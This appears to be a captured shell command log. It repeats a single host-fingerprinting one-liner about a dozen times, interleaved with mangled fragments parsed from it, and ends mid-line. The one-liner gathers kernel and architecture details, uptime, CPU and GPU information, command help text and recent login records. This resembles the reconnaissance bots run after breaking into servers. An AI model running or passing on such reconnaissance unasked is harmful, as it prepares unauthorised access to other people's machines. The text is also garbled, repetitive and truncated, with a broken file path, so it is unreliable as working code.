uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo 